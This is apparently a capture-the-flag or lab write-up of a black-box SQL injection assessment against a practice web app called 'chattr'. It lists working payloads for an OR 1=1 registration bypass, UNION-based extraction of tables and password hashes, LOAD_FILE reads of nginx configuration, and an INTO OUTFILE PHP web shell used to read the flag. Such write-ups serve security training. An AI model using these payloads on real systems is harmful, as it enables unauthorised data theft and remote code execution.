## Scenario
You have been contracted by `chattr GmbH` to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with `SQL injection vulnerabilities` and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform an assessment specifically focused on testing for SQL injection vulnerabilities on the web application from a "black box" approach.


#### Questions
1. What is the password hash for the user 'admin'?
2. What is the root path of the web application?
3. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below.

#### Solutions
1. First injection point is in the invitationCode in register.php. We can close the query with ) and write a OR 1=1 so the condition will always be true and we will are able to register:
```SQL
Payload: username=vdarras&password=vdarras&repeatPassword=vdarras&invitationCode=asda-aeas-1234') OR 1=1 -- -
```
Then we see that the q parameter of the search fonctionnality is vulnerable:
```SQL
First payload to enumerate current db:
GET /index.php?q=Hello')+UNION+select+1,2,database(),database()--+-&u=1 HTTP/1.1

DB : chattr
---------------------------

Second payload to enumerate tables:
GET /index.php?q=Hello')+UNION+select+1,2,TABLE_NAME,TABLE_SCHEMA+from+INFORMATION_SCHEMA.TABLES+where+table_schema%3d'chattr'--+-&u=1 HTTP/1.1

Users,InvitationCodes,Messages
------------------------------

Third payload to enumerate column:
GET /index.php?q=Hello')+UNION+select+1,2,COLUMN_NAME,TABLE_SCHEMA+from+INFORMATION_SCHEMA.COLUMNS+where+table_name%3d'Users'--+-&u=1 HTTP/1.1

UserID, Username, Password, InvitationCode, AccountCreated
--------------------------------

Fourth payload to get data:
GET /index.php?q=Hello')+UNION+select+1,+2,+Username,+Password+from+chattr.Users--+-&u=1 HTTP/1.1

admin:$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU

bmdyy:$argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4
...
----------------------------------
Answer: $argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

2. Continue on the same vulnerable parameter
```SQL
Enumerate actual user:
GET /index.php?q=Hello')+UNION+SELECT+1,+2,+user(),+4--+-&u=1 HTTP/1.1

chattr_dbUser@localhost
-----------------------------------

Enumerate ou privilege:
GET /index.php?q=Hello')+UNION+SELECT+1,+grantee,+privilege_type,+4+FROM+information_schema.user_privileges+WHERE+grantee%3d"'chattr_dbUser'%40'localhost'"--+-&u=1 HTTP/1.1

FILE
-----------------------------------
We see we can read file let's try to find the web root path.
Leak nginx.conf:
GET /index.php?q=Hello')+UNION+SELECT+1,+2,+LOAD_FILE("/etc/nginx/nginx.conf"),+4--+-&u=1 HTTP/1.1

We don't see any web root in this file let's enumerate other potential files:

GET /index.php?q=Hello')+UNION+SELECT+1,+2,+LOAD_FILE("/etc/nginx/sites-enabled/default"),+4--+-&u=1 HTTP/1.1

...
root /var/www/chattr-prod;
...
Answer : /var/www/chattr-prod
```

3. Let's create and write a web shell into a file.
```sql
GET /index.php?q=Hello')+union+select+"",+"",+'<%3fphp+system($_REQUEST[0])%3b+%3f>',+""+into+outfile+'/var/www/chattr-prod/file.txt'--+-&u=1 HTTP/1.1

Enumerate directories and we can access the flag:
https://94.237.58.137:52167/shell.php?0=cat%20../../../flag_876a4c.txt

061b1aeb94dec6bf5d9c27032b3c1d8d
```